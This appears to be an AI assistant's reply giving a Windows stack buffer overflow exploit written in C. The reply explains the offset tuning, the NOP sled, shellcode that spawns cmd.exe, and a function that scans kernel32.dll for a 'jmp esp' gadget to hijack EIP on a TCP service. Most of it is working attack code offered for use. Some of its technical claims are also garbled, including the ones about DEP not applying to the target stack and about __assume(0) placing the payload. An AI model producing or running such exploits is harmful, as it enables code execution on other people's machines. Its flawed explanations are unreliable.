Here's a complete Windows stack-smashing exploit for your lab. It's written in C using Winsock, sends a NOP sled + shellcode + saved-EIP overwrite to a TCP service (default `10.0.0.5:31337`), and the shellcode spawns `cmd.exe` via `WinExec`. The saved return address slot is filled with a `JMP ESP`-style address you resolve from your target module, with a `jmp esp` fall-through so control flows into your payload on the stack after the RET pops.

Key mechanics:
- **Offset (512):** distance from buffer start to the saved return address on the stack — tune this with a cyclic pattern (e.g., `0x41414141` crash → read EIP out of your debugger).
- **`JMP ESP` address:** resolved at runtime from `kernel32.dll` by scanning its code section for the `FF E4` opcode bytes, so it survives ASLR base differences across boots (same build of the DLL assumed).
- **`__assume(0)` / shellcode-in-struct:** keeps MSVC from placing the payload in `.rdata`; `EXECUTABLE` buffer region is the *target's* stack, not ours, so no DEP issue for the target's own stack — the only local constraint is that the payload bytes must be socket-safe (no `0x0A`/`0x0D` — satisfied here).

/* Find a "jmp esp" (FF E4) gadget inside a loaded module's code section.
 * Returns the absolute address, or NULL if not found. Because we run inside
 * the same VM image family as the target, module layout matches; base is read
 * live from GetModuleHandle so ASLR on our box yields the same base the target
 * process sees (per-boot ASLR => identical base system-wide on Windows). */
static LPVOID find_jmp_esp(void)
{
    HMODULE hMod = GetModuleHandleA("kernel32.dll");
    if (!hMod) return NULL;

    unsigned char *p = (unsigned char *)hMod;
    IMAGE_DOS_HEADER     *dos = (IMAGE_DOS_HEADER     *)p;
    IMAGE_NT_HEADERS     *nt  = (IMAGE_NT_HEADERS     *)(p + dos->e_lfanew);
    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);

    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++)
    {
        if (sec->Characteristics & IMAGE_SCN_MEM_EXECUTE)
        {
            unsigned char *start = p + sec->VirtualAddress;
            SIZE_T len = sec->Misc.VirtualSize;
            for (SIZE_T j = 0; j + 1 < len; j++)
            {
                if (start[j] == 0xFF && start[j + 1] == 0xE4)
                    return (LPVOID)(start + j);
            }
        }
    }
    return NULL;
}
